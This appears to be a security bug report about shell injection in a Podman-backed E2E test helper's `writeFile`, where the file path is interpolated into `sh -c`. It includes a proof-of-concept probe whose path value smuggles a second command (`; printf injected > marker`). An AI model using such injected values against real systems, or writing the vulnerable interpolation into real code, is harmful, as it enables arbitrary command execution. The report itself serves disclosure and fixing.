# E2E persistent container writeFile path shell injection executes commands

## Summary

`createPersistentContainer()` implements `Container.writeFile(filePath, content)` by interpolating `filePath` into a `sh -c` command. A path containing shell metacharacters executes additional commands instead of being treated only as a destination filename.

## Reproduction

1. From the repository root, save this disposable probe as `probe.mts`:

   ```ts
   import fs from "node:fs/promises";
   import os from "node:os";
   import path from "node:path";

   const root = await fs.mkdtemp(path.join(os.tmpdir(), "poe-persistent-write-inject-"));
   const fakeBin = path.join(root, "bin");
   const marker = path.join(root, "marker");
   await fs.mkdir(fakeBin, { recursive: true });
   await fs.writeFile(
     path.join(fakeBin, "podman"),
     `#!/bin/sh
   case "$1" in
     --version) echo fake; exit 0 ;;
     create) echo fake-container; exit 0 ;;
     start|rm) exit 0 ;;
     exec) shift; [ "$1" = "-i" ] && shift; shift; shift 2; /bin/sh -c "$1" ;;
   esac
   `,
     { mode: 0o755 }
   );

   process.env.PATH = `${fakeBin}:${process.env.PATH}`;
   const { createPersistentContainer } = await import(
     "./packages/e2e-test-runner/src/persistent-container.ts"
   );
   const container = await createPersistentContainer({ image: "fake:image" });
   try {
     await container.writeFile(
       `${path.join(root, "normal-output")}; printf injected > ${marker}`,
       "content"
     );
     console.log(await fs.readFile(marker, "utf8"));
   } finally {
     await container.destroy();
   }
   ```

2. Execute it with `./node_modules/.bin/tsx ./probe.mts`.

## Observed Behavior

The probe prints `injected`. Its fake Podman executable evaluates exactly the shell command passed to the container runtime, demonstrating that the path string produces `cat > <path>; printf injected > <marker>` rather than a single file write.

`Container.writeFile()` creates a shell command using `` `cat > ${filePath}` `` in `packages/e2e-test-runner/src/persistent-container.ts:402` and passes it as the argument to `sh -c` without shell quoting or argv-safe file handling.

## Expected Behavior

`writeFile(filePath, content)` should write content to the requested path and must not interpret shell metacharacters in `filePath` as additional commands.

## Impact

A caller able to supply a file path to the Podman-backed E2E helper can execute arbitrary commands inside the persistent test container. This can tamper with test state, mounted caches, snapshot data, or credentials available in that container environment.
